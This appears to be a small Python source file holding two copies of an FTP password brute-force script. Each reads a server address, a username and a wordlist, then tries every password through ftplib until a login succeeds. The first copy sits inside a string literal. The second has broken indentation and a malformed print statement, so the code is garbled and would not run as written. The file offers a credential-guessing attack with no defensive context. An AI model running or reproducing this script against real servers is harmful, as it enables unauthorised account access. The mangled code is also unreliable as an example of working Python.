"""

import ftplib

server = input("ftp server: ")

user = input("enter username: ")

passlist = input("enter the list: ")

try:

   with open(passlist, 'r') as pw:

     for  word in pw:

	word = word.strip('\r').strip('\n')

	try:

            ftp = ftplib.FTP(server)

	    ftp.login(user, word)

	    print (f"success! the password is {word} ")

	except:

		print("still trying......")

except:

    print ("list error")
"""
import ftplib

server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input ("Path to Password List > ")

  try:
with open(Passwordlist, 'r') as pw:
for word in pw:
 word = word.strip ('\r').strip('\n')
 try:
ftp = ftplib.FTP(server)
ftp.login(user, word)
 print (Success! The password is ' + word)
 except:
print('still trying...')
except:
print ('Wordlist error')
